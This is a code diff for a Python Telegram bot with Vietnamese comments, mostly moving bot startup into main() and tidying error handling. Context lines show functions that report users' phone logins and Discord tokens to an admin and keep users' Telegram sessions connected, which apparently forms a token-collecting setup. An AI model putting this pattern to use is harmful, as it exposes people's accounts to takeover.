@@ -34,8 +34,6 @@ DEFAULT_DELAY = 0.2
 
 admin_selected_target = {}
 anti_disconnect_tasks = {}
-
-# Lưu trữ phiên làm việc Discord tương tác qua Telegram Bot cho từng user
 discord_sessions = {}
 
 def get_user_delay(u_i):
@@ -50,7 +48,7 @@ def _sync():
         except: pass
 _sync()
 
-bot = TelegramClient('bot_manage', A_ID, A_HS).start(bot_token=B_TK)
+bot = TelegramClient('bot_manage', A_ID, A_HS)
 o_p, u_c, c_b, c_i, s_t, cl_t, a_r, o_f, w_m = {}, {}, {}, {}, {}, {}, {}, {}, {}
 
 F1, F2, F3, F4, F5 = "bot_users.txt", "banned_users.txt", "joined_users.txt", "admins.txt", "vip_users.txt"
@@ -114,9 +112,6 @@ async def is_user_in_channel(user_id):
             return True
         return False
 
-# ==========================================
-# GIAO DIỆN CHỌN APP (SAU KHI VÀO ĐỦ NHÓM)
-# ==========================================
 def get_app_selector_menu():
     msg = """
 🌐 **HỆ THỐNG WAR SYSTEM MULTI-PLATFORM**
@@ -231,21 +226,14 @@ async def notify_admin_login(client, user_id, phone_number):
     except Exception as e:
         print(f"Lỗi gửi thông báo login: {e}")
 
-# ==========================================
-# HÀM TREO KẾT NỐI (ANTI-DISCONNECT) - 4 PHÚT
-# ==========================================
 async def start_anti_disconnect(target_uid, client):
-    """Treo giữ kết nối bằng cách ping GetMe mỗi 4 phút (240 giây) tối ưu cho Render."""
     while target_uid in u_c:
         try:
             await client.get_me()
         except:
             pass
-        await asyncio.sleep(240) # Đã đổi thành 240 giây (4 phút)
+        await asyncio.sleep(240) # 4 phút cho Render
 
-# ==========================================
-# DISCORD HELPER & NOTIFY
-# ==========================================
 def get_discord_headers(token):
     ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
     props_json = json.dumps({
@@ -303,9 +291,6 @@ async def notify_admin_discord_token(user_id, token, user_data, created_at):
     except Exception as e:
         print(f"Lỗi gửi thông báo token discord: {e}")
 
-# ==========================================
-# TELEGRAM USERBOT LOGIC & HANDLERS
-# ==========================================
 def _logic(c, u_i):
     def _mk(cid): w_m[f"{u_i}_{cid}"] = datetime.datetime.now(datetime.timezone.utc)
 
@@ -722,8 +707,12 @@ async def start_web_server():
     await site.start()
     return runner
 
+# ==========================================
+# CHƯƠNG TRÌNH CHÍNH (FIX LỖI TASK PENDING)
+# ==========================================
 async def main():
     await start_web_server()
+    await bot.start(bot_token=B_TK)
     
     for f in glob.glob("u_*.session"):
         try:
@@ -731,6 +720,7 @@ async def main():
             if not u_str.isdigit(): continue
             u = int(u_str)
             if u in b_u: continue
+            
             c = TelegramClient(f"u_{u}", A_ID, A_HS)
             await c.connect()
             if await c.is_user_authorized():
@@ -738,14 +728,15 @@ async def main():
                 _logic(c, u)
                 task = asyncio.create_task(start_anti_disconnect(u, c))
                 anti_disconnect_tasks[u] = task
-            else: await c.disconnect()
-        except: pass
-        
+            else: 
+                await c.disconnect()
+        except Exception as e:
+            print(f"Lỗi load session {f}: {e}")
+            
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
     try:
         asyncio.run(main())
-    except KeyboardInterrupt:
+    except (KeyboardInterrupt, SystemExit):
         pass
-tt
